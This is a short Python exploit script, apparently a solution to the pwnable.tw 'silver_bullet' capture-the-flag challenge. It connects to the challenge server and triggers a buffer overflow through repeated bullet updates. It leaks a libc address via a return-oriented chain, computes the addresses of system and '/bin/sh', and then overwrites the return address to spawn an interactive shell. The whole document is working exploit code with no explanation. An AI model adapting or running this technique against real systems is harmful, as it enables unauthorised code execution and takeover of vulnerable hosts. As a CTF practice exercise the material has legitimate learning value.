from pwn import *
p = remote('chall.pwnable.tw',10103)
#p = process('./silver_bullet')

def create(content):
    p.sendlineafter("Your choice :","1")
    p.sendlineafter("Give me your description of bullet :",str(content))

def update(content):
    p.sendlineafter("Your choice :","2")
    p.sendlineafter("Give me your another description of bullet :",str(content))

def beat():
    p.sendlineafter("Your choice :","3")

create("a"*47)
update("a")
exp = "\xff\xff\x7f" + "b"*4 + p32(0x080484a8) + p32(0x08048954)+ p32(0x0804afd4)
update(exp)
beat()
beat()
p.recvuntil('Oh ! You win !!\n')
leak = u32(p.recv(4))
print hex(leak)
system = leak - 0xe6e0
print hex(system)
binsh = system + 0x11e54b
print hex(binsh)
p.recvline()
create("b"*47)
update("b")
exp = "\xff\xff\x7f" + "d"*4 + p32(system) +"c"*4 + p32(binsh) + "a"*12
update(exp)
beat()
#gdb.attach(p)
beat()
p.interactive()
